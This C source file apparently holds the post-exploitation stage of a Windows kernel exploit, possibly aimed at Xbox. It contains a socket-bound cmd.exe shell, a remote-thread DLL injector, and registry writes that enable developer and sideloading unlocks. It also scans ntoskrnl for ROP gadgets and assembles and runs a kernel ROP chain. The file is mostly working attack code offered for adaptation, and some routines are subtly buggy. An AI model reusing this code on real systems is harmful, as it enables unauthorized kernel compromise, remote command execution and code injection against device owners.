#include "post_exploit.h"
#include "win_defs.h"
#include "ioring.h"
#include "util.h"
#include "krnl_dumper.h"
#include "rop.h"

#include <stdio.h>
#include <Windows.h>
#include <lmcons.h>
#include <metahost.h>
#include <ntstatus.h>
#include <inttypes.h>
#include "nt_offsets.h"
#include "Zydis.h"
#pragma comment(lib, "mscoree.lib")



char* sock_read(SOCKET sock) {
    char msg[1024] = { 0 };
    recv(sock, msg, 1024, MSG_PEEK);
}

void spawn_cmd(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
    while (1) {}
}

int inject_dll(HANDLE hProcess, char* dllPath) {
    HMODULE hKernel32 = GetModuleHandle("KernelBase");
    if (!hKernel32)
        return -1;

    VOID* pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
        return -2;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess,
        NULL,
        sizeof(dllPath) + 1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!pRemoteBuffer)
        return -3;

    if(!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, sizeof(dllPath) + 1, 0))
        return -4;

    HANDLE hRemoteThread = CreateRemoteThread(hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuffer,
        0,
        NULL);
    
    return 0;
}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void hexdump32(SOCKET s, UINT64 address) {
    CHAR ptr_msg[1024] = { 0 };
    char byteBuffer[0x20] = { 0 };
    krnl_read_s(address, byteBuffer, sizeof(byteBuffer));

    char out[256] = { 0 };
    hex_dump(byteBuffer, sizeof(byteBuffer), out);

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "%s\n", out);
    sock_log(s, ptr_msg);
}

UINT64 pteBase = 0;
SOCKET gSock;
void testrop() {
    while (1) {
        sock_log(gSock, "\rWaiting for pte base... ");
        if (pteBase != 0) {
            sock_log(gSock, "rop chain returned pte base!!!!\n");
            return;
        }
        Sleep(10);
    }
}

void print_code(SOCKET s, UINT64 base, UINT64 addr, int size, ZydisDecoder* decoder, ZydisFormatter* formatter) {
    CHAR msg[1024] = { 0 };
    ZyanU8* data = (ZyanU8*)malloc(size);

    krnl_read_s(addr, data, size);

    ZyanU64 runtime_address = base + addr;
    ZyanUSize offset = 0;
    const ZyanUSize length = sizeof(data);
    ZydisDecodedInstruction instruction;
    ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT];
    while (ZYAN_SUCCESS(ZydisDecoderDecodeFull(decoder, data + offset, length - offset,
        &instruction, operands)))
    {
        // Print current instruction pointer.
        sprintf_s(msg, "%016" PRIX64 "  ", runtime_address);
        sock_log(s, msg);

        // Format & print the binary instruction structure to human-readable format
        char buffer[256];
        ZydisFormatterFormatInstruction(formatter, &instruction, operands,
            instruction.operand_count_visible, buffer, sizeof(buffer), runtime_address, ZYAN_NULL);
        sock_log(s, buffer);
        //sock_log(s, "\n");

        offset += instruction.length;
        runtime_address += instruction.length;
    }
}

extern UINT64 threaderCounter;

void cleanup_and_halt() {
    ioring_cleanup();
    while(1){}
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock, UINT64 ntBase)
{
    CHAR msg[1024] = { 0 };

    sock_log(sock, "-hpayload\n");
    
    int data = 1;
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"OSDATA\\Software\\Microsoft\\SecurityManager",
        L"InternalDevUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] InternalDevUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        L"AppModelUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AppModelUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
        L"AllowDevelopmentWithoutDevLicense",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AllowDevelopmentWithoutDevLicense enabled.\n");
    
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CHAR ptr_msg[1024] = { 0 };

    dump_kmodules(sock);

    hdump_get_keys(ntBase);

    UINT64 baseData;
    krnl_read_s(ntBase, &baseData, sizeof(UINT64));
    if (!baseData)
        sock_log(sock, "bad read\n");

    HEADER_KEYS headerKeys = get_header_keys();
    UINT64 headerAddr = krnl_header_address(ntBase, baseData, headerKeys.key1, headerKeys.key2);

    //hdump_rtlimagentheaderex(sock, ntBase);

    //krnl_read_s(ntBase+0x38, &baseData, sizeof(UINT64));
    //if (!baseData)
    //    sock_log(sock, "bad read\n");
    //sock_log(sock, "[?] nt header dump:\n");
    //hexdump32(sock, krnl_header_address(ntBase, baseData, key1, key2));

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Header keys: [0x%llx/0x%llx]\n[?] Header addr: 0x%llx\n", headerKeys.key1, headerKeys.key2, headerAddr);
    sock_log(sock, ptr_msg);
    cleanup_and_halt();
    // might be worth finding gadgets in a different module
    sock_log(sock, "[?] Scanning for ROP gadgets...\n");

    dict_t gadgets = scan_gadgets(sock, ntBase);
    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "\n[?] Found %i gadgets!\n",
        gadgets->len);
    sock_log(sock, ptr_msg);
    UINT64 outpg;
    for (int i = 0; i < gadgets->len; i++) {
        const char* name = gadgets->entry[i].key;
        MMPTE pte = get_pagetable_entry(gadgets->entry[i].value, &outpg);
        UINT64 executable = pte.u.Hard.NoExecute;
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[?] [%s]: [0x%llx/NX:%i]\n", name, gadgets->entry[i].value, executable);
        sock_log(sock, ptr_msg);
    }

    //dict_free(gadgets);
    
    HANDLE dummyThread = create_dummy_thread();

    char getprocSig[17] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0xC3 };

    UINT64 offset = 0x0;
    UINT64 getProcAddr = 0;
    UINT64 termThreadAddr = 0;
    /*do {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "\r[?] Scanning for PsGetCurrentProcess. [0x%llx]",
            ntBase + offset);
        sock_log(sock, ptr_msg);
        getProcAddr = krnl_sigscan_s(ntBase + offset, getprocSig, 17);
        offset += 0x1000;
        //if (offset < textSection.Misc.VirtualSize)
        //break;
    } while (getProcAddr == 0);

   /* do {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "\r[?] Scanning for ret. [0x%llx]",
            ntBase + offset);
        sock_log(sock, ptr_msg);
        termThreadAddr = krnl_sigscan_s(ntBase + offset, getprocSig, 17);
        offset += 0x1000;
        //if (offset < textSection.Misc.VirtualSize)
        //break;
    } while (termThreadAddr == 0);*/


    UINT64 ropChain[] = {
        dict_find(gadgets,         "pop rcx ; ret ;", 0),
        ntBase,                  // pass ntoskrnl.exe base address into GetPteAddress
        dict_find(gadgets,         "pop rax ; ret ;", 0),
        pMiGetPteAddress,        // MiGetPteAddress -> rax
        dict_find(gadgets,         "jmp rax ;", 0),
        dict_find(gadgets,         "pop r8 ; ret ;", 0),
        (&pteBase) - 0x08,       // &pteBase-0x08 -> r8
        dict_find(gadgets,         "mov qword [r8+0x08], rax ; ret ;", 0),
        dict_find(gadgets,         "pop rcx ; ret ;", 0),
        (UINT64)dummyThread,     // dummyThread -> rcx
        dict_find(gadgets,         "pop rdx ; ret ;", 0),
        0x0000000000000000,      // STATUS_SUCESS -> rdx
        dict_find(gadgets,         "pop rax ; ret ;", 0),
        ntBase + 0x444100,       // ZwTerminateThread -> rax
        dict_find(gadgets,         "ret ;", 0),
        dict_find(gadgets,         "jmp rax ;", 0),
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141
    };

   /* UINT64 ropChain[] = {
       ntBase + 0x715f97,		   // pop rax ; ret ;
       ntBase + 0x2b2fa0,		   // PsGetCurrentProcess (a bit low, might fail)
       ntBase + 0x799e3b,		   // jmp rax ;
       ntBase + 0x7b2b9f,		   // pop rcx ; ret ;
       (UINT64)&eprocessObject,   // its possible SMAP is alwyays enabled on xbox despite irql
       ntBase + 0x57eb83,		   // mov qword [rcx], rax ; ret ;
       ntBase + 0x7b2b9f,		   // pop rcx ; ret ;
       (UINT64)dummyThread,	   // handle to thread
       ntBase + 0x4e5af2,		   // pop rdx ; ret ;
       0x0000000000000000,		   // STATUS_SUCCESS
       ntBase + 0x715f97,		   // pop rax ; ret ;
       ntBase + 0x444100,		   // ZwTerminateThread
       ntBase + 0x742219,		   // ret ;
       ntBase + 0x799e3b,		   // jmp rax ;
       0x4141414141414141,
       0x4141414141414141,
       0x4141414141414141
    };*/

    sock_log(sock, "[?] ROP Chain: ->\n");
    for (int i = 0; i < sizeof(ropChain) / sizeof(UINT64); i++) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "    0x%llx;\n", ropChain[i]);
        sock_log(sock, ptr_msg);
    }

    gSock = sock;
    HANDLE testThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)testrop, NULL, 0, NULL);

    sock_log(sock, "[?] Attempting to execute ROP chain...\n");
    execute_ropchain(sock, dummyThread, ntBase, ropChain, sizeof(ropChain));
    Sleep(200);
    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Dummy thread counter: %i\n", threaderCounter);
    sock_log(sock, ptr_msg);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] ROP chain executed!\n[?] EPROCESS via PsGetCurrentProcess: [0x%llx]\n", pteBase);
    sock_log(sock, ptr_msg);

    dict_free(gadgets);
    // kernel rw no longer needed, so do some laundry
    ioring_cleanup();

    spawn_cmd(sock);
    while (1) {}
    
}
